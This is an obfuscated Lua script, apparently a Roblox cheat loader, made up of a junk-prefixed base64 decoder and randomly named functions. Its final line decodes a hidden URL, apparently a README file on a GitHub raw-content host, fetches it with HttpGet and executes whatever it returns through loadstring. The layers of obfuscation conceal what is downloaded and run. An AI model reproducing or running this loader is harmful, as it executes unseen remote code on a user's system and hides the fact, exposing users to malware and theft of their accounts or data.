local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function vyUUeiaKVTDX(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local b=vyUUeiaKVTDX('jirMnRCQRYGXBWpoBiJKQPqSnyCwIpayTwACmAFmBFufPhhlszhXxmSQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLw==')
function GyTUzYtPkxDCdEWOptyTTeFdbwQBbpGjpKqfJCgSGGMDqVadVFRnhwTaoERidLSXtgdhDZSVtDrqUQFBLpLHEKpqPj(data) m=string.sub(data, 0, 55) data=data:gsub(m,vyUUeiaKVTDX('nkOjdyXzfsVICzlYtpWeLUKMlIEWmvTsYDjAmYiUrBZfMgWwIhQjdgA'))

data = string.gsub(data, vyUUeiaKVTDX('sxKrutpSDTepEaDjjNIRpHOYofDECvEuDfehJxTfkPMLJEVqDCibXNnW14=')..b..vyUUeiaKVTDX('czlXflHnyjSIunXfaatARNCBpQDOuVoGUWsNGVlwssxHLdqrLbNaQhtPV0='), vyUUeiaKVTDX('JifOSbneRURzNHaZfRrpDurKiWPYskstXMWJhqhnXakgzRnZHcwVkeL')) return (data:gsub(vyUUeiaKVTDX('XweyvAnukqirWBkdvMdhxYflQhepgTmFhxfwUjizeVFHGyikqfTnCXCLg=='), function(x) if (x == vyUUeiaKVTDX('iQSWfgOBetcqIinYHlPWAPowUbqTPxpYgBMbBnszngiJZwOVkHpqQcQPQ==')) then return vyUUeiaKVTDX('HYJDqlmVcufbcabQdMnjOhaTUAatigAISyhBIbxmzlGiInMrmyvqXwM') end local r,f=vyUUeiaKVTDX('dqmIPUHtJLXZgKZWGgRAAuIpzmwfOnhdRAaAboGXYUURQNDeNbdEQom'),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and vyUUeiaKVTDX('YTWfyzvlYuYWgPjrYfdIYdNLHaUZlxkVxpMvcXLrotUXuPgsBYzYNsmMQ==') or vyUUeiaKVTDX('qurLhSRPDDMPJzBggZFtqfIbxhDaoTPndEBlcKZfzADxySclRGZhRRoMA==')) end return r; end):gsub(vyUUeiaKVTDX('IMIUOuKhiELhpwshHzGciJcwGZvQPrxOPcdIYWhIRlaHeiFGgPYRRXyJWQlZCVkPyVkPyVkPyVkPyVkPyVkPw=='), function(x) if (#x ~= 8) then return vyUUeiaKVTDX('RIJjtKOEiYmQjYTzVMGQDHXAsiSeVuFlNcKrHzhZbxbHGCxjUeLJJwy') end local c=0 for i=1,8 do c=c+(x:sub(i,i)==vyUUeiaKVTDX('iVTbcYnsoomnIPFmKDGPQapxGUSpyJMxielWsOPAdIRuHFLmUKreimoMQ==') and 2^(8-i) or 0) end return string.char(c) end)) end


 


loadstring(game:HttpGet(GyTUzYtPkxDCdEWOptyTTeFdbwQBbpGjpKqfJCgSGGMDqVadVFRnhwTaoERidLSXtgdhDZSVtDrqUQFBLpLHEKpqPj(vyUUeiaKVTDX('hpREkrdAjyBTCZaEkjWVsVsPDAtLYOPrdFrcmzqebdVvMCSCVcRqcngVG92ZkxtbWxOd2plSGdtd09Rb2lad2dGWkRDbWNuT2FPYnhlckJjT3FPSnhrUHdiaFFId1ZKbWFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJGMGJ6RXhORFV4TkM5aGRHOHZiV0ZwYmk5U1JVRkVUVVV1YldRPQ=='))))()        
